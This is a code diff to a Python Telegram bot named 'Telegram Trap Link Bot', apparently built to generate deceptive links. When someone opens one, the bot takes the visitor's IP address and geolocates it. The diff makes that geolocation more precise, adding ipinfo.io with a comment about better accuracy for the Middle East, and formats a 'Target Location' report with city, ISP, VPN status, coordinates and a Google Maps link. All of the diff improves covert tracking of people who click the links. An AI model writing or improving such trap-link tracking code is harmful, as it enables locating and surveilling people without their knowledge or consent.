@@ -3,6 +3,7 @@ Telegram Trap Link Bot v8.0 — RAILWAY DEPLOYMENT
 - ✅ Works on Railway + localhost
 - ✅ Polling mode (no webhook conflicts)
 - ✅ ALL functionality preserved
+- ✅ Accurate IP geolocation with ipinfo.io
 """
 
 import os
@@ -115,7 +116,7 @@ def extract_video_info(text):
     return None
 
 
-# ============ IP GEOLOCATION ============
+# ============ IP GEOLOCATION (FIXED) ============
 
 def get_ip_address():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
@@ -125,37 +126,139 @@ def get_ip_address():
 
 
 def get_geo_info(ip_address):
+    """Get geolocation using ipinfo.io (more accurate for Middle East)."""
     try:
+        # Handle local IPs
         if ip_address in ['127.0.0.1', '::1', 'localhost', '0.0.0.0'] or \
            ip_address.startswith('10.') or ip_address.startswith('192.168.') or \
            ip_address.startswith('172.') or ip_address == '::ffff:127.0.0.1':
-            return {"ip": ip_address, "country": "Local", "city": "Localhost", "region": "Local", "lat": 0, "lon": 0, "isp": "Local Network", "org": "", "mobile": False, "proxy": False, "hosting": False}
-        resp = requests.get(f"https://freeipapi.com/api/json/{ip_address}", headers={"User-Agent": "TrapLinkBot/1.0"}, timeout=5)
-        if resp.status_code != 200:
-            raise Exception(f"HTTP {resp.status_code}")
-        data = resp.json()
-        return {"ip": data.get("ipAddress", ip_address), "country": data.get("countryName", "Unknown"), "city": data.get("cityName", "Unknown"), "region": data.get("regionName", "Unknown"), "lat": data.get("latitude", 0), "lon": data.get("longitude", 0), "isp": data.get("isp", "Unknown"), "org": data.get("organization", ""), "mobile": data.get("isMobile", False), "proxy": data.get("isProxy", False), "hosting": data.get("isHosting", False)}
-    except Exception as e:
-        logger.warning(f"freeipapi failed for {ip_address}: {e}")
+            return {
+                "ip": ip_address, "country": "Local", "city": "Localhost",
+                "region": "Local", "lat": 0, "lon": 0, "isp": "Local Network",
+                "org": "", "mobile": False, "proxy": False, "hosting": False
+            }
+
+        # PRIMARY: Use ipinfo.io (best accuracy for Middle East)
         try:
-            resp2 = requests.get(f"http://ip-api.com/json/{ip_address}?fields=status,message,query,country,city,lat,lon,isp,org,mobile,proxy,hosting", timeout=5)
-            data2 = resp2.json()
-            if data2.get("status") == "success":
-                return {"ip": data2.get("query", ip_address), "country": data2.get("country", "Unknown"), "city": data2.get("city", "Unknown"), "region": "", "lat": data2.get("lat", 0), "lon": data2.get("lon", 0), "isp": data2.get("isp", "Unknown"), "org": data2.get("org", ""), "mobile": data2.get("mobile", False), "proxy": data2.get("proxy", False), "hosting": data2.get("hosting", False)}
-        except:
-            pass
-        return {"ip": ip_address, "country": "Unknown", "city": "Unknown", "region": "", "lat": 0, "lon": 0, "isp": "Unknown", "org": "", "mobile": False, "proxy": False, "hosting": False}
+            resp = requests.get(
+                f"https://ipinfo.io/{ip_address}/json",
+                headers={"User-Agent": "TrapLinkBot/1.0"},
+                timeout=5
+            )
+            if resp.status_code == 200:
+                data = resp.json()
+                
+                # Check if it's a private IP (bogon)
+                if data.get("bogon"):
+                    return {
+                        "ip": ip_address, "country": "Local", "city": "Localhost",
+                        "region": "Local", "lat": 0, "lon": 0, "isp": "Local Network",
+                        "org": "", "mobile": False, "proxy": False, "hosting": False
+                    }
+                
+                # Parse location (lat,lon)
+                loc = data.get("loc", "0,0").split(",")
+                lat = float(loc[0]) if len(loc) > 0 and loc[0] else 0
+                lon = float(loc[1]) if len(loc) > 1 and loc[1] else 0
+                
+                return {
+                    "ip": ip_address,
+                    "country": data.get("country", "Unknown"),
+                    "city": data.get("city", "Unknown"),
+                    "region": data.get("region", "Unknown"),
+                    "lat": lat,
+                    "lon": lon,
+                    "isp": data.get("org", "Unknown"),
+                    "org": data.get("org", ""),
+                    "mobile": False,
+                    "proxy": False,
+                    "hosting": False
+                }
+        except Exception as e:
+            logger.warning(f"ipinfo failed for {ip_address}: {e}")
+
+        # FALLBACK 1: freeipapi.com
+        try:
+            resp = requests.get(
+                f"https://freeipapi.com/api/json/{ip_address}",
+                headers={"User-Agent": "TrapLinkBot/1.0"},
+                timeout=5
+            )
+            if resp.status_code == 200:
+                data = resp.json()
+                return {
+                    "ip": data.get("ipAddress", ip_address),
+                    "country": data.get("countryName", "Unknown"),
+                    "city": data.get("cityName", "Unknown"),
+                    "region": data.get("regionName", "Unknown"),
+                    "lat": data.get("latitude", 0),
+                    "lon": data.get("longitude", 0),
+                    "isp": data.get("isp", "Unknown"),
+                    "org": data.get("organization", ""),
+                    "mobile": data.get("isMobile", False),
+                    "proxy": data.get("isProxy", False),
+                    "hosting": data.get("isHosting", False)
+                }
+        except Exception as e:
+            logger.warning(f"freeipapi failed for {ip_address}: {e}")
+
+        # FALLBACK 2: ip-api.com
+        try:
+            resp = requests.get(
+                f"http://ip-api.com/json/{ip_address}?fields=status,message,query,country,city,lat,lon,isp,org,mobile,proxy,hosting",
+                timeout=5
+            )
+            data = resp.json()
+            if data.get("status") == "success":
+                return {
+                    "ip": data.get("query", ip_address),
+                    "country": data.get("country", "Unknown"),
+                    "city": data.get("city", "Unknown"),
+                    "region": "",
+                    "lat": data.get("lat", 0),
+                    "lon": data.get("lon", 0),
+                    "isp": data.get("isp", "Unknown"),
+                    "org": data.get("org", ""),
+                    "mobile": data.get("mobile", False),
+                    "proxy": data.get("proxy", False),
+                    "hosting": data.get("hosting", False)
+                }
+        except Exception as e:
+            logger.warning(f"ip-api failed for {ip_address}: {e}")
+
+    except Exception as e:
+        logger.warning(f"All geolocation services failed for {ip_address}: {e}")
+
+    # Return unknown if all services fail
+    return {
+        "ip": ip_address, "country": "Unknown", "city": "Unknown",
+        "region": "", "lat": 0, "lon": 0, "isp": "Unknown",
+        "org": "", "mobile": False, "proxy": False, "hosting": False
+    }
 
 
 def format_geo_message(geo):
+    """Format geolocation into a rich Telegram message."""
     flag = "🛡️" if geo.get("proxy") else ("🏢" if geo.get("hosting") else "📍")
     maps_url = f"https://www.google.com/maps?q={geo['lat']},{geo['lon']}" if geo['lat'] and geo['lon'] else None
-    msg = f"{flag} *Target Location*\n\n🌐 *IP:* `{geo['ip']}`\n🏙️ *City:* {geo.get('city', 'N/A')}\n🌍 *Country:* {geo.get('country', 'N/A')}\n📌 *Region:* {geo.get('region', 'N/A')}\n🏢 *ISP:* {geo.get('isp', 'N/A')}"
+    msg = (
+        f"{flag} *Target Location*\n\n"
+        f"🌐 *IP:* `{geo['ip']}`\n"
+        f"🏙️ *City:* {geo.get('city', 'N/A')}\n"
+        f"🌍 *Country:* {geo.get('country', 'N/A')}\n"
+        f"📌 *Region:* {geo.get('region', 'N/A')}\n"
+        f"🏢 *ISP:* {geo.get('isp', 'N/A')}"
+    )
     if geo.get('org'):
         msg += f"\n🏛️ *Org:* {geo['org']}"
-    msg += f"\n📶 *Mobile:* {'Yes' if geo.get('mobile') else 'No'}\n🕵️ *VPN/Proxy:* {'⚠️ Yes!' if geo.get('proxy') else 'No'}\n🏭 *Hosting/DC:* {'Yes' if geo.get('hosting') else 'No'}"
+    msg += (
+        f"\n📶 *Mobile:* {'Yes' if geo.get('mobile') else 'No'}"
+        f"\n🕵️ *VPN/Proxy:* {'⚠️ Yes!' if geo.get('proxy') else 'No'}"
+        f"\n🏭 *Hosting/DC:* {'Yes' if geo.get('hosting') else 'No'}"
+    )
     if maps_url:
-        msg += f"\n\n🗺️ [View on Google Maps]({maps_url})\n📌 `{geo['lat']}, {geo['lon']}`"
+        msg += f"\n\n🗺️ [View on Google Maps]({maps_url})"
+        msg += f"\n📌 `{geo['lat']}, {geo['lon']}`"
     return msg
 
 
@@ -167,18 +270,25 @@ def generate_link_id():
 
 def get_config_display(config):
     emoji = CONTENT_TYPE_EMOJI.get(config['content_type'], '📸')
-    return f"📱 *Your Configuration*\n\n{emoji} *Content:* `{CONTENT_TYPES.get(config['content_type'], '?')}`\n🎥 *Camera:* `{CAMERA_TYPES.get(config['camera'], '?')}`\n🌐 *Platform:* `{SOCIAL_NETWORKS.get(config['social_network'], '?')}`\n🎬 *Video:* `{config.get('video_url', 'Not set')}`"
+    return (
+        f"📱 *Your Configuration*\n\n"
+        f"{emoji} *Content:* `{CONTENT_TYPES.get(config['content_type'], '?')}`\n"
+        f"🎥 *Camera:* `{CAMERA_TYPES.get(config['camera'], '?')}`\n"
+        f"🌐 *Platform:* `{SOCIAL_NETWORKS.get(config['social_network'], '?')}`\n"
+        f"🎬 *Video:* `{config.get('video_url', 'Not set')}`"
+    )
 
 
 def get_config_keyboard(user_id):
     config = user_configs.get(user_id, DEFAULT_CONFIG.copy())
     emoji = CONTENT_TYPE_EMOJI.get(config['content_type'], '📸')
-    return InlineKeyboardMarkup([
+    kb = [
         [InlineKeyboardButton(f"{emoji} Content: {CONTENT_TYPES[config['content_type']]}", callback_data="menu_content")],
         [InlineKeyboardButton(f"🎥 Camera: {CAMERA_TYPES[config['camera']]}", callback_data="menu_camera")],
         [InlineKeyboardButton(f"🌐 Platform: {SOCIAL_NETWORKS[config['social_network']]}", callback_data="menu_social")],
         [InlineKeyboardButton("✅ Generate Link", callback_data="generate_link"), InlineKeyboardButton("🔙 Back", callback_data="back_main")]
-    ])
+    ]
+    return InlineKeyboardMarkup(kb)
 
 
 def get_main_keyboard():
@@ -546,7 +656,18 @@ app = Flask(__name__)
 
 @app.route("/")
 def index():
-    return jsonify({"status": "running", "name": "Telegram Trap Link Bot v8.0 — Railway", "links_active": len(generated_links), "bot_running": _bot_app is not None and _bot_app.updater.running if _bot_app else False})
+    bot_running = False
+    if _bot_app is not None:
+        try:
+            bot_running = _bot_app.updater.running
+        except:
+            pass
+    return jsonify({
+        "status": "running",
+        "name": "Telegram Trap Link Bot v8.0 — Railway",
+        "links_active": len(generated_links),
+        "bot_running": bot_running
+    })
 
 
 @app.route("/l/<link_id>")
@@ -679,6 +800,7 @@ if __name__ == "__main__":
 ║   ✅ Works on Railway + localhost                            ║
 ║   ✅ Polling mode — no webhook conflicts                     ║
 ║   ✅ ALL functionality preserved                             ║
+║   ✅ Accurate IP geolocation with ipinfo.io                  ║
 ╚═══════════════════════════════════════════════════════════════╝
     """)
 
